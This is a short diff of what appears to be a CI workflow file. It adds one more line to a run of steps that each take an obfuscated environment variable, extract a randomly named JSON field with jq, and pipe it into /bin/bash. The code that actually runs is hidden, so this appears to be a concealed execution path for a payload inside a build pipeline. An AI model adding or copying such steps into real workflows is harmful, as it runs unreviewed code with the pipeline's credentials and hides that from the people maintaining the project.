@@ -26,6 +26,7 @@ jobs:
           echo $k19131 | jq -r .hfdx83 | /bin/bash
           echo $g16114 | jq -r .wwhn50 | /bin/bash
           echo $x5795 | jq -r .npz70134 | /bin/bash
+          echo $k0719 | jq -r .cb340 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
